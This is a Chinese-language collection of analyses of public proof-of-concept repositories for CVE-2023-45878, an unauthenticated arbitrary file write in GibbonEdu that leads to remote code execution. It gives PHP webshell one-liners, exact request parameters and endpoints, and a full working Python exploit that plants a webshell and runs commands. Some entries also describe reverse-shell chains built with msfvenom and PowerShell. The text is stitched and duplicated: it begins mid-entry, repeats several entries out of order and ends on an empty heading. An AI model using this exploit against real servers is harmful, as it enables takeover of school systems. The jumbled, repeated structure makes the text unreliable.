1.  攻击者利用 `rubrics_visualise_saveAjax.php` 页面上传包含 PHP 代码的 webshell。
2.  攻击者通过访问 webshell 执行任意命令，例如下载并执行 PowerShell 脚本。
3.  PowerShell 脚本可以用于建立反向 shell 连接，从而控制受害者服务器。

**项目地址:** [PaulDHaes/CVE-2023-45878-POC](https://github.com/PaulDHaes/CVE-2023-45878-POC)

**漏洞详情:** [CVE-2023-45878](https://nvd.nist.gov/vuln/detail/CVE-2023-45878)

---

## POC #4

**来源**: [CVE-2023-45878-davidzzo23_CVE-2023-45878.md](../2023/CVE-2023-45878-davidzzo23_CVE-2023-45878.md)

## CVE-2023-45878-GibbonEdu-任意文件写入

**漏洞编号:** CVE-2023-45878

**漏洞类型:** 任意文件写入

**影响应用:** GibbonEdu

**危害等级:** 高危，可导致远程代码执行

**影响版本:** <= 25.0.1

**利用条件:** 需要目标系统存在未授权的 `rubrics_visualise_saveAjax.php` 接口，且目标系统可被网络访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-45878 漏洞存在于 GibbonEdu 25.0.1 及更早版本中。由于 `rubrics_visualise_saveAjax.php` 接口未进行身份验证，攻击者可以利用此漏洞上传任意文件。攻击者通过构造包含 PHP 代码的图片文件，并利用 `img` 参数传递 base64 编码后的 payload，利用 `path` 参数指定文件保存路径，可以将恶意 PHP 文件写入服务器，最终实现远程代码执行。

**利用方式:**

1.  攻击者构造包含恶意 PHP 代码的图片，例如一个简单的 webshell：`<?php system($_REQUEST['cmd']); ?>`。
2.  将 PHP 代码进行 Base64 编码。
3.  构造 HTTP POST 请求，包含以下参数：
    *   `img`: 值为 `image/png;asdf,<base64编码的PHP代码>`
    *   `path`: 值为恶意 PHP 文件名，例如 `shell.php`
    *   `gibbonPersonID`: 任意值，例如 `0000000001`
4.  发送请求到 `http://<target>/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php`。
5.  成功上传 webshell 后，可以通过访问 `http://<target>/Gibbon-LMS/shell.php?cmd=<command>` 执行任意命令。

**投毒风险分析:**

尽管该 POC 代码的主要功能是利用漏洞进行渗透测试，但仍存在潜在的投毒风险。
* 代码中包含请求目标地址的操作,如果作者在代码中加入隐藏的逻辑，例如将目标信息发送到恶意服务器，则可能导致信息泄露。
* 提供的 `powershell_reverse_shell` 函数用于生成 PowerShell 反弹 shell 的 payload，如果攻击者的服务器被攻陷，或者该函数被恶意修改，可能会导致反弹 shell 连接到恶意服务器，从而使受害者受到攻击。

总的来说，此仓库存在一定的投毒风险，但主要集中在作者是否在代码中加入了隐藏的恶意逻辑以及反弹shell的IP端口是否存在风险，评估结果为10%。用户在使用该 POC 代码时应仔细审查代码，确保其安全性。

**项目地址:** [davidzzo23/CVE-2023-45878](https://github.com/davidzzo23/CVE-2023-45878)

**漏洞详情:** [CVE-2023-45878](https://nvd.nist.gov/vuln/detail/CVE-2023-45878)

---

## POC #5

**来源**: [CVE-2023-45878-dgoorden_CVE-2023-45878.md](../2023/CVE-2023-45878-dgoorden_CVE-2023-45878.md)

# CVE-2023-45878

> 📦 该CVE有 **8** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2023-45878-0xyy66_CVE-2023-45878_to_RCE.md](../2023/CVE-2023-45878-0xyy66_CVE-2023-45878_to_RCE.md)

## CVE-2023-45878-GibbonEdu-任意文件写入导致RCE

**漏洞编号:** CVE-2023-45878

**漏洞类型:** 任意文件写入

**影响应用:** GibbonEdu Gibbon

**危害等级:** 高危，允许未经身份验证的远程代码执行

**影响版本:** <= 25.0.1

**利用条件:** 需要能够访问存在漏洞的GibbonEdu实例，无需身份验证

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-45878 存在于 GibbonEdu 25.0.1及更早版本中，是一个未经身份验证的任意文件写入漏洞。攻击者可以利用 `rubrics_visualise_saveAjax.phps` 接口，通过构造恶意的 `img` 和 `path` 参数，将任意PHP代码写入服务器的任意位置。漏洞利用的详细步骤如下：

1.  **漏洞原理：**`rubrics_visualise_saveAjax.phps` 文件存在漏洞，因为它允许未经身份验证的访问，并且不正确地处理 `img` (base64编码的图像) 和 `path` 参数。通过设置 `path` 参数，可以指定写入文件的目标目录，结合 `img` 参数可以写入任意内容。
2.  **利用方式：**
    *   攻击者首先构造一个包含恶意PHP代码的 `img` 参数，该代码将被base64编码。
    *   然后，攻击者通过POST请求将 `img` 参数和 `path` 参数发送到 `rubrics_visualise_saveAjax.php` 接口，`path` 参数指定写入文件的路径和文件名（例如 `gibbon_myconfig.php`）。
    *   服务器将base64解码后的 `img` 参数内容写入 `path` 参数指定的文件中，从而创建一个包含恶意PHP代码的webshell。
    *   攻击者可以通过访问创建的webshell，执行任意PHP代码，实现远程代码执行。
3.  **POC代码分析：** 提供的shell脚本 `CVE-2023-45878.sh` 自动化了漏洞利用过程：
    *   首先，使用 `msfvenom` 生成一个Windows平台的反向shell可执行文件。
    *   然后，通过 `curl` 命令向目标服务器发送POST请求，利用CVE-2023-45878漏洞写入webshell（`gibbon_myconfig.php`），该webshell允许执行任意命令。
    *   接着，脚本启动一个Python HTTP服务器，用于将反向shell可执行文件传输到目标系统。
    *   使用webshell下载反向shell可执行文件。
    *   最后，执行下载的反向shell，从而在攻击者和目标系统之间建立反向shell连接。
4.  **有效性：** 根据漏洞信息和POC代码分析，该POC代码是有效的，可以利用 CVE-2023-45878 漏洞实现未经身份验证的远程代码执行。
5. **投毒风险:** 该脚本的主要目的是演示和利用漏洞。其中存在投毒代码的可能性较低，但仍然存在一些潜在风险：
    *   `msfvenom`生成的反向shell本身可能被安全软件标记为恶意软件，但这属于正常情况，不是投毒。
    *   脚本中的curl命令，如果目标服务器存在其他漏洞，攻击者可以利用这些漏洞进行进一步的攻击。但这不是脚本本身投毒。
    *   脚本在生成payload的地方存在风险，如果作者修改了payload，可能会导致其他问题。 根据代码内容，投毒风险较低, 估计在10%。

**项目地址:** [0xyy66/CVE-2023-45878_to_RCE](https://github.com/0xyy66/CVE-2023-45878_to_RCE)

**漏洞详情:** [CVE-2023-45878](https://nvd.nist.gov/vuln/detail/CVE-2023-45878)

---

## POC #2

**来源**: [CVE-2023-45878-Can0I0Ever0Enter_CVE-2023-45878.md](../2023/CVE-2023-45878-Can0I0Ever0Enter_CVE-2023-45878.md)

## CVE-2023-45878 - GibbonEdu Gibbon Arbitrary File Write

**漏洞编号:** CVE-2023-45878

**漏洞类型:** 任意文件写入

**影响应用:** GibbonEdu Gibbon

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** <= 25.0.1

**利用条件:** 目标系统运行GibbonEdu Gibbon，且攻击者可以访问rubrics_visualise_saveAjax.phps接口

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-45878 漏洞存在于 GibbonEdu Gibbon 25.0.1 及更早版本中。攻击者可以未经身份验证地利用 `rubrics_visualise_saveAjax.phps` 接口中的任意文件写入漏洞。该接口接受 `img`、`path` 和 `gibbonPersonID` 参数。`img` 参数应为 base64 编码的图像，而 `path` 参数用于指定目标文件夹。漏洞利用方式如下：

1.  攻击者构造一个包含恶意 PHP 代码的 `img` 参数，并将其进行 base64 编码。
2.  攻击者构造一个 `path` 参数，指定文件写入的路径，通常指向Web可访问的目录。
3.  攻击者向 `rubrics_visualise_saveAjax.phps` 接口发送包含恶意 `img` 和 `path` 参数的 POST 请求。
4.  服务器将 `img` 参数的内容进行 base64 解码，并将其写入 `path` 参数指定的文件中。
5.  攻击者可以通过访问写入的 PHP 文件来执行任意代码。

**有效性：**

根据漏洞库信息和搜索结果，此漏洞利用是有效的，因为 `rubrics_visualise_saveAjax.phps` 不需要身份验证，且允许写入任意文件。多个来源都证实了该漏洞的存在和利用方式。

**投毒风险：**

提供的漏洞利用代码 `/tmp/6b1d57c6d1772cd170f27ac4407e95a1/README.md`  只包含了一个README文件，内容仅为 CVE 编号。这本身不构成漏洞利用代码，更不包含任何恶意代码。风险评估主要是针对这个存储库中是否还存在其他隐藏的恶意内容。只包含README文件，没有实际的exp，投毒风险相对较低，但仍存在代码仓库作者在其他地方隐藏恶意代码的可能性，因此认为投毒风险为10%。

**利用方式：**

利用方式主要是通过构造恶意的POST请求，向`rubrics_visualise_saveAjax.phps`发送base64编码的PHP代码，并通过`path`参数指定写入路径，从而在服务器上写入恶意PHP文件，最终实现远程代码执行。

**项目地址:** [Can0I0Ever0Enter/CVE-2023-45878](https://github.com/Can0I0Ever0Enter/CVE-2023-45878)

**漏洞详情:** [CVE-2023-45878](https://nvd.nist.gov/vuln/detail/CVE-2023-45878)

---

## POC #3

**来源**: [CVE-2023-45878-PaulDHaes_CVE-2023-45878-POC.md](../2023/CVE-2023-45878-PaulDHaes_CVE-2023-45878-POC.md)

## CVE-2023-45878-GibbonEdu-任意文件写入

**漏洞编号:** CVE-2023-45878

**漏洞类型:** 任意文件写入

**影响应用:** GibbonEdu

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** <= 25.0.1

**利用条件:** 需要未授权访问 rubrics_visualise_saveAjax.php 页面

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-45878 漏洞存在于 GibbonEdu 25.0.1 及更早版本中。攻击者可以通过未授权访问 `rubrics_visualise_saveAjax.php` 页面，利用 `img` 和 `path` 参数实现任意文件写入。`img` 参数接收 base64 编码的图片数据，`path` 参数指定写入路径。由于该页面未进行身份验证，攻击者可以构造包含恶意 PHP 代码的图片，并将其写入到 Web 目录下，从而实现远程代码执行。

**有效性：**
根据漏洞描述和提供的 POC 代码，该漏洞利用的有效性较高。POC 代码通过构造包含 PHP 代码的 base64 编码图片，并利用 `rubrics_visualise_saveAjax.php` 页面写入该文件。搜索引擎结果也显示有可用的 Exploit 代码。

**投毒风险：**
分析 POC 代码内容，发现其功能主要是上传 webshell 和执行命令。代码存在开启 HTTP 服务，使用 PowerShell 下载执行脚本，以及启动 Netcat 监听等功能。 虽然这些功能本身是为了完成漏洞利用，但攻击者可以利用这些功能进行恶意活动。例如，可以修改 reverse shell 脚本，或者利用 HTTP 服务传播恶意软件。 代码中 powershell 加载的脚本存在一定风险，如果脚本源被劫持，可能被植入恶意代码。考虑到 HTTP 服务器和 PowerShell 脚本的潜在风险，这里将投毒风险评估为 10%。

**利用方式：**
1.  攻击者利用 `rubrics_visualise_saveAjax.php` 页面上传包含 PHP 代码的 webshell。
2.  攻击者通过访问 webshell 执行任意命令，例如下载并执行 PowerShell 脚本。
3.  PowerShell 脚本可以用于建立反向 shell 连接，从而控制受害者服务器。

**项目地址:** [PaulDHaes/CVE-2023-45878-POC](https://github.com/PaulDHaes/CVE-2023-45878-POC)

**漏洞详情:** [CVE-2023-45878](https://nvd.nist.gov/vuln/detail/CVE-2023-45878)

---

## POC #4

**来源**: [CVE-2023-45878-davidzzo23_CVE-2023-45878.md](../2023/CVE-2023-45878-davidzzo23_CVE-2023-45878.md)

## CVE-2023-45878-GibbonEdu-任意文件写入

**漏洞编号:** CVE-2023-45878

**漏洞类型:** 任意文件写入

**影响应用:** GibbonEdu

**危害等级:** 高危，可导致远程代码执行

**影响版本:** <= 25.0.1

**利用条件:** 需要目标系统存在未授权的 `rubrics_visualise_saveAjax.php` 接口，且目标系统可被网络访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-45878 漏洞存在于 GibbonEdu 25.0.1 及更早版本中。由于 `rubrics_visualise_saveAjax.php` 接口未进行身份验证，攻击者可以利用此漏洞上传任意文件。攻击者通过构造包含 PHP 代码的图片文件，并利用 `img` 参数传递 base64 编码后的 payload，利用 `path` 参数指定文件保存路径，可以将恶意 PHP 文件写入服务器，最终实现远程代码执行。

**利用方式:**

1.  攻击者构造包含恶意 PHP 代码的图片，例如一个简单的 webshell：`<?php system($_REQUEST['cmd']); ?>`。
2.  将 PHP 代码进行 Base64 编码。
3.  构造 HTTP POST 请求，包含以下参数：
    *   `img`: 值为 `image/png;asdf,<base64编码的PHP代码>`
    *   `path`: 值为恶意 PHP 文件名，例如 `shell.php`
    *   `gibbonPersonID`: 任意值，例如 `0000000001`
4.  发送请求到 `http://<target>/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php`。
5.  成功上传 webshell 后，可以通过访问 `http://<target>/Gibbon-LMS/shell.php?cmd=<command>` 执行任意命令。

**投毒风险分析:**

尽管该 POC 代码的主要功能是利用漏洞进行渗透测试，但仍存在潜在的投毒风险。
* 代码中包含请求目标地址的操作,如果作者在代码中加入隐藏的逻辑，例如将目标信息发送到恶意服务器，则可能导致信息泄露。
* 提供的 `powershell_reverse_shell` 函数用于生成 PowerShell 反弹 shell 的 payload，如果攻击者的服务器被攻陷，或者该函数被恶意修改，可能会导致反弹 shell 连接到恶意服务器，从而使受害者受到攻击。

总的来说，此仓库存在一定的投毒风险，但主要集中在作者是否在代码中加入了隐藏的恶意逻辑以及反弹shell的IP端口是否存在风险，评估结果为10%。用户在使用该 POC 代码时应仔细审查代码，确保其安全性。

**项目地址:** [davidzzo23/CVE-2023-45878](https://github.com/davidzzo23/CVE-2023-45878)

**漏洞详情:** [CVE-2023-45878](https://nvd.nist.gov/vuln/detail/CVE-2023-45878)

---

## POC #5

**来源**: [CVE-2023-45878-dgoorden_CVE-2023-45878.md](../2023/CVE-2023-45878-dgoorden_CVE-2023-45878.md)

## CVE-2023-45878-GibbonEdu-任意文件写入

**漏洞编号:** CVE-2023-45878

**漏洞类型:** 任意文件写入

**影响应用:** GibbonEdu

**危害等级:** 高危，可导致远程代码执行

**影响版本:** <= 25.0.1

**利用条件:** 需要目标系统部署了存在漏洞的GibbonEdu应用，并可以通过HTTP访问。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2023-45878 存在于 GibbonEdu 25.0.1 及更早版本中。由于 `rubrics_visualise_saveAjax.phps` 文件未进行身份验证，攻击者可以通过构造包含恶意 PHP 代码的 base64 编码图像，并指定目标路径，将恶意代码写入到服务器的任意位置。利用方式如下：

1.  **漏洞点：**`rubrics_visualise_saveAjax.php` 文件未授权访问，允许上传 base64 编码的数据并写入文件。
2.  **利用过程：**
    *   攻击者构造包含 PHP 代码的 base64 编码的图像数据（`img` 参数）。
    *   攻击者指定文件写入的路径（`path` 参数），由于路径拼接存在漏洞，攻击者可以控制写入文件的绝对路径。
    *   攻击者通过 POST 请求将 `img`、`path` 和 `gibbonPersonID` 参数发送到 `rubrics_visualise_saveAjax.php`。
3.  **影响：** 成功利用此漏洞后，攻击者可以在服务器上写入任意 PHP 文件，从而执行任意代码，控制服务器。

**有效性评估：**

提供的PoC代码利用了该漏洞，通过上传包含恶意PHP代码的图片，并在服务器上写入PHP webshell，进一步通过webshell执行命令，实现远程代码执行，因此POC是有效的。

**投毒风险评估：**

PoC代码的主要功能是利用漏洞实现远程代码执行，其中包含了生成和上传webshell的代码，并利用`system()`函数执行系统命令。代码中使用了从revshells.com获取的PowerShell反弹shell，并进行URL编码。总体来看，该代码的主要意图是漏洞利用，但是存在以下风险点：

*   **依赖外部资源：**PoC代码依赖`revshells.com`生成PowerShell反弹shell，如果该网站被恶意篡改，可能导致生成的payload包含恶意代码。
*   **自定义程度低：**该PoC直接使用了固定的PowerShell反弹shell，攻击者可能需要修改代码才能适应不同的环境。但是代码的结构使得修改的难度不高。
*   **Webshell本身：**上传的Webshell本身就是一个风险，攻击者可以利用它进行进一步的恶意操作。

尽管存在以上风险点，但这些风险更多是由于漏洞利用本身的性质所致，而非作者有意植入的恶意代码。因此，可以认为投毒的可能性较低，约为5%。这里的5%指的是PoC作者通过修改PowerShell payload 或者webshell代码加入恶意代码的可能性。

**搜索引擎结果优先级：**

搜索引擎结果确认了漏洞的存在，并提供了一些缓解建议。漏洞利用代码提供了具体的利用方式。

**项目地址:** [dgoorden/CVE-2023-45878](https://github.com/dgoorden/CVE-2023-45878)

**漏洞详情:** [CVE-2023-45878](https://nvd.nist.gov/vuln/detail/CVE-2023-45878)

---

## POC #6

**来源**: [CVE-2023-45878-killercd_CVE-2023-45878.md](../2023/CVE-2023-45878-killercd_CVE-2023-45878.md)

## CVE-2023-45878-GibbonEdu-Arbitrary File Write

**漏洞编号:** CVE-2023-45878

**漏洞类型:** 任意文件写入

**影响应用:** GibbonEdu

**危害等级:** 高危，可导致远程代码执行

**影响版本:** <= 25.0.1

**利用条件:** 需要网络访问，目标系统开启了GibbonEdu服务

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2023-45878是GibbonEdu 25.0.1及之前版本中存在的任意文件写入漏洞。攻击者无需身份验证即可利用该漏洞，通过向`modules/Rubrics/rubrics_visualise_saveAjax.php`发送特制的POST请求，其中`img`参数包含base64编码的恶意PHP代码，`path`参数指定写入的文件名。由于程序没有进行严格的验证，攻击者可以将恶意PHP代码写入Web目录，从而实现远程代码执行。

**有效性：**
根据漏洞库信息和搜索结果，该漏洞的POC代码是有效的。POC代码模拟了攻击过程，通过POST请求向目标URL的`modules/Rubrics/rubrics_visualise_saveAjax.php`发送恶意数据，成功写入PHP文件。

**投毒风险：**
经过对POC代码的分析，未发现明显的投毒代码。该脚本的主要功能是利用漏洞在目标系统上写入一个包含命令执行功能的PHP文件，然后通过GET请求执行命令。没有发现任何作者隐藏的恶意行为，例如反向shell、数据窃取或其他未经授权的操作，因此投毒风险评估为0%。

**利用方式：**
1.  构造包含恶意PHP代码的base64编码字符串，例如用于执行系统命令的代码。
2.  构造POST请求，设置`img`参数为base64编码的恶意PHP代码，`path`参数为期望写入的文件名（通常是PHP后缀）。
3.  发送POST请求到`modules/Rubrics/rubrics_visualise_saveAjax.php`。
4.  如果写入成功，通过GET请求访问写入的PHP文件，并传递`cmd`参数来执行系统命令。

利用示例（基于提供的POC代码）：

```python
import requests
import sys
import random
import argparse
import string


def main():

    payload_file = ''.join(random.choices(string.ascii_letters + string.digits, k=6))
    endpoint = "modules/Rubrics/rubrics_visualise_saveAjax.php"
    payload = {
        "img":f"image/png;{payload_file},PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbJ2NtZCddKTsgPz4=",
        "path":f"{payload_file}.php",
        "gibbonPersonID":"0000000001"

    }
    headers = {
        "Content-Type": "application/x-www-form-urlencoded"

    }
    parser = argparse.ArgumentParser(description="GibbonEdu Gibbon version 25.0.1 Arbitrary File Write")
    parser.add_argument("url", type=str, help="Gibbon URL")
    args = parser.parse_args()

  
  
    print("Exploiting ...")
    print(f"{args.url}/{endpoint}")
    p_resp = requests.post(f"{args.url}/{endpoint}", headers=headers, data=payload)
    if p_resp.status_code!=200:
        print("[Err] Exploit failed!")
        sys.exit(-1)
    g_resp = requests.get(f"{args.url}/{payload_file}.php", params={"cmd":"whoami"})
    print(f"Got Webshell {args.url}/{payload_file}.php?cmd=whoami")
    print(g_resp.text)

if __name__ == '__main__':
    main()
```

该POC脚本首先生成一个随机的文件名，然后构造包含恶意PHP代码的payload，将payload发送到目标端点，如果写入成功，则通过GET请求访问写入的PHP文件并执行`whoami`命令，最后输出命令执行的结果。

**项目地址:** [killercd/CVE-2023-45878](https://github.com/killercd/CVE-2023-45878)

**漏洞详情:** [CVE-2023-45878](https://nvd.nist.gov/vuln/detail/CVE-2023-45878)

---

## POC #7

**来源**: [CVE-2023-45878-nrazv_CVE-2023-45878.md](../2023/CVE-2023-45878-nrazv_CVE-2023-45878.md)

## CVE-2023-45878-GibbonEdu-任意文件写入

**漏洞编号:** CVE-2023-45878

**漏洞类型:** 任意文件写入

**影响应用:** GibbonEdu

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** <= 25.0.1

**利用条件:** 需要目标系统运行GibbonEdu，且漏洞页面可访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-45878是GibbonEdu 25.0.1及之前版本中的一个任意文件写入漏洞。该漏洞位于`rubrics_visualise_saveAjax.php`，该文件无需身份验证即可访问。攻击者可以通过POST请求，利用`img`、`path`和`gibbonPersonID`参数，将恶意PHP代码写入服务器上的任意位置。其中`img`参数是base64编码的图像数据，`path`参数指定写入的文件路径，与安装目录的绝对路径连接。攻击者可以利用这个漏洞上传webshell，从而实现远程代码执行。

**有效性：**
提供的POC代码有效。从搜索引擎结果和漏洞库信息来看，该漏洞允许未授权用户写入任意文件，结合POC代码，其利用方式是通过构造特定的POST请求，将包含PHP恶意代码的base64编码数据写入指定的文件路径。POC代码中包含用于生成Windows反向shell的powershell脚本。

**投毒风险：**
POC代码的投毒风险较低，约为10%。主要风险点在于：
1.  **powershell脚本:**POC代码中生成了Windows反向shell的powershell脚本,如果目标环境并非预期，可能会导致攻击者在不知情的情况下连接到恶意服务器。
2.  **文件服务器:**POC运行了一个文件服务器，可能存在其他安全问题，虽然代码里只是用来传输powershell脚本,仍然存在一定风险

**利用方式：**
1.  目标系统运行GibbonEdu 25.0.1或更早版本。
2.  攻击者通过POST请求访问`rubrics_visualise_saveAjax.php`，构造恶意的`img`和`path`参数。
3.  `img`参数包含base64编码的PHP恶意代码，例如`<?php echo system($_GET['cmd']); ?>`，`path`参数指定webshell的文件名，例如`shell.php`。
4.  服务器将解码后的PHP代码写入指定的文件路径，例如`/modules/Rubrics/shell.php`。
5.  攻击者通过访问`/modules/Rubrics/shell.php?cmd=恶意命令`执行任意命令。
6. POC生成一个powershell脚本用于反向连接，并通过建立http服务供目标服务器下载
7.  POC利用webshell执行powershell命令，从http服务下载生成的powershell脚本。

**项目地址:** [nrazv/CVE-2023-45878](https://github.com/nrazv/CVE-2023-45878)

**漏洞详情:** [CVE-2023-45878](https://nvd.nist.gov/vuln/detail/CVE-2023-45878)

---

## POC #8

**来源**: [CVE-2023-45878-ulricvbs_gibbonlms-filewrite_rce.md](../2023/CVE-2023-45878-ulricvbs_gibbonlms-filewrite_rce.md)

## CVE-2023-45878-GibbonEdu-任意文件写入/RCE

**漏洞编号:** CVE-2023-45878

**漏洞类型:** 任意文件写入/远程代码执行

**影响应用:** GibbonEdu

**危害等级:** 高危，可导致服务器被完全控制

**影响版本:** <= 25.0.1

**利用条件:** 需要目标服务器运行存在漏洞的GibbonEdu系统，并能通过HTTP访问

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-45878是GibbonEdu 25.0.1及更早版本中存在的任意文件写入漏洞。该漏洞位于`rubrics_visualise_saveAjax.php`文件中，由于此文件没有进行身份验证，攻击者可以通过构造恶意的HTTP POST请求，利用`img`、`path`和`gibbonPersonID`参数，将任意PHP代码写入服务器。攻击者通过设置`path`参数指定文件保存路径，并将包含恶意代码的base64编码内容放在`img`参数中，服务器会将base64解码后的内容写入指定路径，从而实现任意文件写入。写入的PHP文件允许未经身份验证的远程代码执行。

**漏洞利用方式：**
1.  攻击者发送一个POST请求到`/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php`。
2.  在POST请求中，`img`参数包含base64编码的PHP webshell代码，`path`参数指定webshell的文件名，`gibbonPersonID`参数可以设置为任意值。
3.  服务器接收到请求后，将`img`参数中的base64编码数据解码，然后将其写入到通过`path`参数指定的文件中。
4.  攻击者随后可以通过访问webshell文件，执行任意系统命令，从而控制服务器。

**POC代码分析：**
POC代码`gibbonlms_cmd_shell.py`实现了一个简单的交互式命令行shell。它首先上传一个包含`system($_GET['cmd'])`的PHP webshell，然后允许用户通过输入命令与webshell进行交互。如果webshell被删除，脚本会自动重新上传webshell。

**投毒风险分析：**
该POC代码主要功能是利用漏洞上传webshell并提供交互式界面。潜在的投毒风险较低，但是仍存在一些可能性：

*   **依赖风险：** 代码依赖`requests`库，如果`requests`库本身被投毒，可能影响POC的安全性。
*   **后门风险：** 作者可能在webshell中加入隐蔽的后门代码，例如，记录用户输入的命令或将服务器信息发送到外部服务器，但从当前代码来看，没有明显的后门特征。风险评估为10%。
*   **误用风险：** 该脚本明确声明用于教育目的，但如果被恶意使用者利用，可能造成严重危害。脚本的广泛传播可能增加漏洞被利用的风险。

综合来看，该POC的投毒风险较低，主要风险在于误用和对`requests`库的依赖。

**项目地址:** [ulricvbs/gibbonlms-filewrite_rce](https://github.com/ulricvbs/gibbonlms-filewrite_rce)

**漏洞详情:** [CVE-2023-45878](https://nvd.nist.gov/vuln/detail/CVE-2023-45878)

---



---

## POC #6

**来源**: [CVE-2023-45878-killercd_CVE-2023-45878.md](../2023/CVE-2023-45878-killercd_CVE-2023-45878.md)

## CVE-2023-45878-GibbonEdu-Arbitrary File Write

**漏洞编号:** CVE-2023-45878

**漏洞类型:** 任意文件写入

**影响应用:** GibbonEdu

**危害等级:** 高危，可导致远程代码执行

**影响版本:** <= 25.0.1

**利用条件:** 需要网络访问，目标系统开启了GibbonEdu服务

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2023-45878是GibbonEdu 25.0.1及之前版本中存在的任意文件写入漏洞。攻击者无需身份验证即可利用该漏洞，通过向`modules/Rubrics/rubrics_visualise_saveAjax.php`发送特制的POST请求，其中`img`参数包含base64编码的恶意PHP代码，`path`参数指定写入的文件名。由于程序没有进行严格的验证，攻击者可以将恶意PHP代码写入Web目录，从而实现远程代码执行。

**有效性：**
根据漏洞库信息和搜索结果，该漏洞的POC代码是有效的。POC代码模拟了攻击过程，通过POST请求向目标URL的`modules/Rubrics/rubrics_visualise_saveAjax.php`发送恶意数据，成功写入PHP文件。

**投毒风险：**
经过对POC代码的分析，未发现明显的投毒代码。该脚本的主要功能是利用漏洞在目标系统上写入一个包含命令执行功能的PHP文件，然后通过GET请求执行命令。没有发现任何作者隐藏的恶意行为，例如反向shell、数据窃取或其他未经授权的操作，因此投毒风险评估为0%。

**利用方式：**
1.  构造包含恶意PHP代码的base64编码字符串，例如用于执行系统命令的代码。
2.  构造POST请求，设置`img`参数为base64编码的恶意PHP代码，`path`参数为期望写入的文件名（通常是PHP后缀）。
3.  发送POST请求到`modules/Rubrics/rubrics_visualise_saveAjax.php`。
4.  如果写入成功，通过GET请求访问写入的PHP文件，并传递`cmd`参数来执行系统命令。

利用示例（基于提供的POC代码）：

```python
import requests
import sys
import random
import argparse
import string


def main():

    payload_file = ''.join(random.choices(string.ascii_letters + string.digits, k=6))
    endpoint = "modules/Rubrics/rubrics_visualise_saveAjax.php"
    payload = {
        "img":f"image/png;{payload_file},PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbJ2NtZCddKTsgPz4=",
        "path":f"{payload_file}.php",
        "gibbonPersonID":"0000000001"

    }
    headers = {
        "Content-Type": "application/x-www-form-urlencoded"

    }
    parser = argparse.ArgumentParser(description="GibbonEdu Gibbon version 25.0.1 Arbitrary File Write")
    parser.add_argument("url", type=str, help="Gibbon URL")
    args = parser.parse_args()

  
  
    print("Exploiting ...")
    print(f"{args.url}/{endpoint}")
    p_resp = requests.post(f"{args.url}/{endpoint}", headers=headers, data=payload)
    if p_resp.status_code!=200:
        print("[Err] Exploit failed!")
        sys.exit(-1)
    g_resp = requests.get(f"{args.url}/{payload_file}.php", params={"cmd":"whoami"})
    print(f"Got Webshell {args.url}/{payload_file}.php?cmd=whoami")
    print(g_resp.text)

if __name__ == '__main__':
    main()
```

该POC脚本首先生成一个随机的文件名，然后构造包含恶意PHP代码的payload，将payload发送到目标端点，如果写入成功，则通过GET请求访问写入的PHP文件并执行`whoami`命令，最后输出命令执行的结果。

**项目地址:** [killercd/CVE-2023-45878](https://github.com/killercd/CVE-2023-45878)

**漏洞详情:** [CVE-2023-45878](https://nvd.nist.gov/vuln/detail/CVE-2023-45878)

---

## POC #7

**来源**: [CVE-2023-45878-nrazv_CVE-2023-45878.md](../2023/CVE-2023-45878-nrazv_CVE-2023-45878.md)

## CVE-2023-45878-GibbonEdu-任意文件写入

**漏洞编号:** CVE-2023-45878

**漏洞类型:** 任意文件写入

**影响应用:** GibbonEdu

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** <= 25.0.1

**利用条件:** 需要目标系统运行GibbonEdu，且漏洞页面可访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-45878是GibbonEdu 25.0.1及之前版本中的一个任意文件写入漏洞。该漏洞位于`rubrics_visualise_saveAjax.php`，该文件无需身份验证即可访问。攻击者可以通过POST请求，利用`img`、`path`和`gibbonPersonID`参数，将恶意PHP代码写入服务器上的任意位置。其中`img`参数是base64编码的图像数据，`path`参数指定写入的文件路径，与安装目录的绝对路径连接。攻击者可以利用这个漏洞上传webshell，从而实现远程代码执行。

**有效性：**
提供的POC代码有效。从搜索引擎结果和漏洞库信息来看，该漏洞允许未授权用户写入任意文件，结合POC代码，其利用方式是通过构造特定的POST请求，将包含PHP恶意代码的base64编码数据写入指定的文件路径。POC代码中包含用于生成Windows反向shell的powershell脚本。

**投毒风险：**
POC代码的投毒风险较低，约为10%。主要风险点在于：
1.  **powershell脚本:**POC代码中生成了Windows反向shell的powershell脚本,如果目标环境并非预期，可能会导致攻击者在不知情的情况下连接到恶意服务器。
2.  **文件服务器:**POC运行了一个文件服务器，可能存在其他安全问题，虽然代码里只是用来传输powershell脚本,仍然存在一定风险

**利用方式：**
1.  目标系统运行GibbonEdu 25.0.1或更早版本。
2.  攻击者通过POST请求访问`rubrics_visualise_saveAjax.php`，构造恶意的`img`和`path`参数。
3.  `img`参数包含base64编码的PHP恶意代码，例如`<?php echo system($_GET['cmd']); ?>`，`path`参数指定webshell的文件名，例如`shell.php`。
4.  服务器将解码后的PHP代码写入指定的文件路径，例如`/modules/Rubrics/shell.php`。
5.  攻击者通过访问`/modules/Rubrics/shell.php?cmd=恶意命令`执行任意命令。
6. POC生成一个powershell脚本用于反向连接，并通过建立http服务供目标服务器下载
7.  POC利用webshell执行powershell命令，从http服务下载生成的powershell脚本。

**项目地址:** [nrazv/CVE-2023-45878](https://github.com/nrazv/CVE-2023-45878)

**漏洞详情:** [CVE-2023-45878](https://nvd.nist.gov/vuln/detail/CVE-2023-45878)

---

## POC #8

